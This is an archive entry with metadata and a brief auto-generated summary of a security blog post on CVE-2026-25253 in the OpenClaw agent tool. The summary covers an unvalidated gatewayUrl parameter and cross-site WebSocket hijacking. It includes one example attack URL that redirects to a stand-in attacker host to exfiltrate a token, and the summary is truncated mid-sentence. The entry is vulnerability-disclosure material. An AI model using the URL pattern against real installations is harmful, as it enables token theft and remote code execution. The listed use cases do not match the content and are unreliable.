---
title: 1-Click RCE To Steal Your OpenClaw Data and Keys (CVE-2026-25253) | depthfirst
archive_category: rag-systems
source_category: ai/rag
source_url: https://depthfirst.com/post/1-click-rce-to-steal-your-moltbot-data-and-keys
resource_id: blog:1-click-rce-to-steal-your-openclaw-data-and-keys-c
local_vault_path: ai/rag/1-click-rce-to-steal-your-openclaw-data-and-keys-c.md
quality_score: 70
archive_score: 72
archive_tier: useful
resource_kind: tutorial
importance: medium
tags:
- agents
- rag
- web-crawled
selection_reason:
- Strong keyword match
- Valuable developer reference
---

# 1-Click RCE To Steal Your OpenClaw Data and Keys (CVE-2026-25253) | depthfirst

## Why This Is In The Archive

- Matched archive category: `RAG Systems`
- Quality score: 70 | Archive score: 72 (useful)
- Resource kind: tutorial
- Selection reasons:
  - Strong keyword match
  - Valuable developer reference

## Summary

- **Unvalidated Gateway URL Injection**: OpenClaw's `app-settings.ts` blindly accepted and persisted a `gatewayUrl` query parameter from URLs (e.g., `https://localhost?gatewayUrl=attacker.com`), enabling arbitrary WebSocket endpoint redirection and token exfiltration.

- **Cross-Site WebSocket Hijacking (CSWSH)**: OpenClaw's WebSocket server failed to validate the `origin` header, allowing attackers to bypass localhost restrictions via malicious JavaScript on a victim's browser, enabling unautho

## Use Cases

- Knowledge querying
- Document summarization
- Hybrid retrieval

## Source

Original source URL: https://depthfirst.com/post/1-click-rce-to-steal-your-moltbot-data-and-keys

## Local Vault File

Path: [1-click-rce-to-steal-your-openclaw-data-and-keys-c.md](../../ai/rag/1-click-rce-to-steal-your-openclaw-data-and-keys-c.md)
